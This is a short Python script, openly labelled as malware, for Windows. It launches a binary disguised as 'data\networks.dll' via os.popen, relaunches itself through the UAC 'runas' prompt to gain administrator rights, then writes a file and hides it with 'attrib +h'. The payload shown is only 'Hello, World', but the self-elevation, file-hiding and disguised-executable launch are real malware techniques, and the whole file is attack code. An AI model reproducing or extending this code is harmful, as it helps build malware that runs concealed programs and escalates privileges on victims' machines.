import os, ctypes, sys
malware_file_name = "malware.txt"
def make_file_hidden(fileName):
    os.system("attrib +h " + fileName)

os.popen("data\\networks.dll")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    with open(malware_file_name, "w") as f:
        f.write("Hello, World")
    make_file_hidden(malware_file_name)
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)



